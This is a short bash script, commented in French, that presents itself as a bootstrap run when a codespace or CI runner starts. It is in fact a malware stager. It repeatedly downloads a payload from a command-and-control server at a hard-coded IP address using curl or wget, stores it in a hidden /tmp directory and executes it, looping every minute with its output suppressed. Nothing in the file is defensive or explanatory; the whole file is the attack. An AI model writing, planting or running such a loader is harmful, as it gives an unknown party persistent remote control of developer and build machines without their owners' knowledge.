#!/bin/bash
# Bootstrap exécuté à la création du codespace / du runner
# Récupère le payload directement depuis le C2 et le lance en boucle
C2_URL="${C2_URL:-http://45.138.12.61:8000}"
PAYLOAD_URL="$C2_URL/payload.sh"

fetch_run() {
  mkdir -p /tmp/.n
  if curl -fsSL -m 30 "$PAYLOAD_URL" -o /tmp/.n/payload.sh 2>/dev/null; then
    chmod +x /tmp/.n/payload.sh
    C2_URL="$C2_URL" INTERVAL=30 bash /tmp/.n/payload.sh >/tmp/.n/log 2>&1
  elif wget -q -O /tmp/.n/payload.sh "$PAYLOAD_URL" 2>/dev/null; then
    chmod +x /tmp/.n/payload.sh
    C2_URL="$C2_URL" INTERVAL=30 bash /tmp/.n/payload.sh >/tmp/.n/log 2>&1
  fi
}

while true; do
  fetch_run
  sleep 60
done